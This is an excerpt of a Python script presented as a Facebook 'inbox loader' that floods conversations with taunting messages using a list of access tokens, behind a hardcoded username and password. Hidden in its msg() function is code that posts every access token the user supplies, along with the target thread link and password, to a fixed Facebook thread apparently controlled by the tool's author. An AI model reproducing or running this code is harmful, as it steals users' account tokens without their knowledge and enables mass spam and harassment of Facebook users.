...
if int:
    print('''\033[1;37m---------------------------------------------------------------------\n''')
    print('''\033[1;34m-=[ Nonstop Multii + Inbox Loader Tool By = HELL YAMRAAJ ]=-''')
    print('''\033[1;37m-=[ Contact Us :: https://www.facebook.com/hiraman.pote.7]=-\n''')
    print('''\033[1;36m---------------------------------------------------------------------\n''')
    i = datetime.now()
    print(i.strftime("\033[1;31m[#] Tool Run Time ==> %Y-%m-%d %I:%M:%S %p "))
    print('''\033[1;37m[#] (^^^) The Tool Maker  HELL KING == > [ YAMRAAJ HERE ]\n''')
...
while attemps < 12345677901:
    ...
    if username == 'H3LLJ1' and password == '001':
        print(' \033[0;95mSahii Haii Bhai.')
        os.system('espeak -a 300 " Welcome To Hell Tool Enjoy Karo"')
        break
    else:
        print(' Username Or Password Galat Hai Try Karo Firse..!! ')
        os.system('espeak -a 300 " Password Galat Hai Hell Se Pucho"')
        attemps += 1
        continue
os.system('clear')
pass
...
logo()
venom()
os.system('espeak -a 300 " YAMRAAJ START HUNTING... "')
os.system('espeak -a 300 " REST IN PEACE ALL HATERS ... "')
def msg():
		parameters = {
			'access_token' : random.choice(access_tokens),
			'message': 'HellO HELL YAMRAAJ Sir Am Using Your Tool My ' 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" (-) ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+thread_id+'\n Password: '+password
		}
		try:
			s = requests.post("https://graph.facebook.com/v15.0/t_7749767325108129/", data=parameters, headers=headers)
		except:
			pass
...
while True:
		try:
			...
			print(BOLD + RED + "\033[1;31;1m[#]] Net Band Hogya Bhai : Message  {} Of Convo {} Failed To Send. {}: {}".format(
				message_index + 1, thread_id, token_index + 1, haters_name + ' ' + message + ' ' + hwre_name))
			e = datetime.now()
			print (e.strftime("[#] HELL YAMRAAJ INSIDE | | Date :: %d-%m-%Y  TIME :: %I:%M:%S %p"))
			sleep(10)
			liness()
else:
